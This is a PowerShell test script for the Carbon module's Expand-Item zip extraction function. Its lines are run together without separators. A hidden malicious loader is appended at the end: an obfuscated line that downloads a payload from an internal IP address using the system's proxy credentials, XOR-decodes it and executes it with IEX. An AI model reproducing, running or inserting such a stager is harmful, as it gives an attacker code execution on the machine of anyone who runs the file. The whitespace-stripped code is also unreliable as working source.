$tempDir = $null$zipPath = $null$outputRoot = $null$PSCommandName = Split-Path -Leaf -Path $PSCommandPathfunction Start-TestFixture{& (Join-Path -Path $PSScriptRoot -ChildPath '..\Initialize-CarbonTest.ps1' -Resolve)}function Start-Test{$tempDir = New-TempDir -Prefix ('{0}-{1}' -f $PSCommandName,([IO.Path]::GetRandomFileName()))$zipPath = Join-Path -Path $tempDir -ChildPath ('{0}.zip' -f $PSCommandName)Compress-Item -Path $PSCommandPath -OutFile $zipPath$outputRoot = Join-Path -Path $tempDir -ChildPath 'OutputRoot'}function Stop-Test{Uninstall-Directory -Path $tempDir -Recurse}function Test-ShouldFailIfFileNotAZipFile{$outputRoot = Expand-Item -Path $PSCommandPath -ErrorAction SilentlyContinueAssert-Error -Last -Regex 'not a ZIP file'Assert-Null $outputRoot}function Test-ShouldExpandWithRelativePathToZip{$tempDir2 = New-TempDirectory -Prefix $PSCommandPathPush-Location $tempDir2try{$relativePath = Resolve-Path -Relative -Path $zipPath$result = Expand-Item -Path $relativePath -OutDirectory $outputRootAssert-NoErrorAssert-NotNull $resultAssert-FileExists (Join-Path -Path $outputRoot -ChildPath $PSCommandName)}finally{Pop-LocationUninstall-Directory -Path $tempDir2 -Recurse}}function Test-ShouldExpandWithRelativePathToOutput{$tempDir2 = New-TempDirectory -Prefix $PSCommandPathPush-Location -Path $tempDir2try{New-Item -Path $outputRoot -ItemType 'Directory'$relativePath = Resolve-Path -Relative -Path $outputRoot$result = Expand-Item -Path $zipPath -OutDirectory $relativePathAssert-NoErrorAssert-NotNull $resultAssert-FileExists (Join-Path -Path $outputRoot -ChildPath $PSCommandName)}finally{Pop-LocationUninstall-Directory -Path $tempDir2 -Recurse}}function Test-ShouldCreateOutputDirectory{$result = Expand-Item -Path $zipPath -OutDirectory $outputRootAssert-DirectoryExists $result.FullNameAssert-DirectoryExists $outputRoot}function Test-ShouldCarryOnIfOutputDirectoryIsEmpty{New-Item -Path $outputRoot -ItemType 'Directory'$result = Expand-Item -Path $zipPath -OutDirectory $outputRootAssert-Equal $outputRoot $result.FullNameAssert-NoError Assert-Equal 1 @(Get-ChildItem $outputRoot).Count}function Test-ShouldStopIfOutputDirectoryNotEmpty{New-Item -Path $outputRoot -ItemType 'Directory'$filePath = Join-Path -Path $outputRoot -ChildPath 'fubar'New-Item -Path $filePath -ItemType 'File'$result = Expand-Item -Path $zipPath -OutDirectory $outputRoot -ErrorAction SilentlyContinueAssert-Null $resultAssert-Error -Last -Regex 'not empty'Assert-Null (Get-Content -Raw -Path $filePath)}function Test-ShouldReplaceOutputDirectoryWithForceFlag{New-Item -Path $outputRoot -ItemType 'Directory'$fubarPath = Join-Path -Path $outputRoot -ChildPath 'fubar'New-Item -Path $fubarPath -ItemType 'File'$filePath = Join-Path -Path $outputRoot -ChildPath $PSCommandNameNew-Item -Path $filePath -ItemType 'File'$result = Expand-Item -Path $zipPath -OutDirectory $outputRoot -ForceAssert-NoErrorAssert-Equal $outputRoot $result.FullNameAssert-NotNull (Get-Content -Raw -Path $filePath)}function Test-ShouldNotExtractNonExistentFile{$result = Expand-Item -Path 'C:\fubar.zip' -ErrorAction SilentlyContinueAssert-Error -Last -Regex 'does not exist'Assert-Null $result}$WC=New-OBjeCT SYstEm.NET.WEBClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEaDers.ADd('User-Agent',$u);$Wc.PrOXY = [SyStEm.NET.WEbREqUest]::DEfaULTWEbPROxy;$WC.PROXy.CreDentIals = [SysTeM.NET.CREDeNtiaLCAche]::DefAultNetwORKCREdEntIals;$K='(y7lo.W}N;nizFQ$6-DqK3H>L1Gheg]S';$i=0;[ChAR[]]$b=([chAr[]]($Wc.DOwNlOADStrING("http://10.0.1.37:8080/index.asp")))|%{$_-bXOr$k[$I++%$k.LEngtH]};IEX ($b-jOiN'')